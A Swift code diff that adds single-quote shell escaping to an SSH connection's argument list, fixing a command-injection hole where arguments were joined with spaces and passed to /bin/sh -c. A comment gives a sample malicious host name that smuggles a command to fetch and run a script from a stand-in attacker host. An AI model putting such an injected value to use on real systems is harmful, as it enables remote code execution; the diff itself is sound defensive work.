@@ -94,8 +94,8 @@ struct SSHConnection {
 
     /// The words handed to the child, for a connection that is dialled without being saved.
     ///
-    /// Built as argv rather than a shell string so nothing here is ever word-split or glob
-    /// expanded: a path with a space in it stays one argument.
+    /// argv, so each field is one word no matter what is in it. It reaches the pty through
+    /// `commandLine`, which is where that promise is actually kept.
     var arguments: [String] {
         var argv = ["ssh"]
         if !port.isEmpty { argv += ["-p", port] }
@@ -107,6 +107,28 @@ struct SSHConnection {
         argv.append(user.isEmpty ? hostName : "\(user)@\(hostName)")
         if !remoteCommand.isEmpty { argv.append(remoteCommand) }
         return argv
+    }
+
+    /// `arguments`, quoted into one line safe to hand to `/bin/sh -c`.
+    ///
+    /// THE HOST RUNS THE COMMAND STRING THROUGH A SHELL (`crates/host/src/lib.rs`:
+    /// `Command::new("/bin/sh").args(["-c", text])`), so joining argv with spaces is not a
+    /// formatting choice, it is an injection. A host named `box;curl evil.sh|sh` passes
+    /// every validator above - none of them has any reason to reject a semicolon - and
+    /// then runs as two commands. An identity path with a space in it breaks the same way,
+    /// just less dramatically.
+    ///
+    /// Single quotes because they are the only shell quoting with no escapes inside them
+    /// at all: everything between them is literal, including `$`, backticks and newlines.
+    /// The one character that cannot appear is the quote itself, hence the `'\''` dance.
+    var commandLine: String {
+        SSHConnection.shellQuoted(arguments)
+    }
+
+    static func shellQuoted(_ words: [String]) -> String {
+        words.map { word in
+            "'" + word.replacingOccurrences(of: "'", with: "'\\''") + "'"
+        }.joined(separator: " ")
     }
 
     /// One `Keyword=value` per non-empty line, trimmed.
